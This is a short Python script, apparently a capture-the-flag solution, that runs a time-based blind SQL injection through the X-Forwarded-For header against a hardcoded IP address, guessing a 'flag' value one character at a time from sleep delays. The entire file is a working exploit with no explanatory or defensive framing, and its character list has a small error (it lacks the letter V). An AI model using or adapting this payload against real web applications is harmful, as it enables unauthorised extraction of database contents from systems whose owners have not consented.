import requests

dic='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'
url = "http://123.206.87.240:8002/web15/"

paylaod_content = "1'+(select case when (substr((select flag from flag) from {0} for 1)) = '{1}' then sleep(6) else 1 end)+'1"
flag = ''
def get_flag():
    global flag
    for i in range(1, 100):
        for j in dic:
            try:
                headers = {'x-forwarded-for': paylaod_content.format(i, j)}
                res = requests.get(url, headers=headers, timeout=5)
            except requests.exceptions.ReadTimeout:
                #print(paylaod_content.format(i, j))
                flag += j
                break
        print("....: "+flag)

get_flag()
print(flag)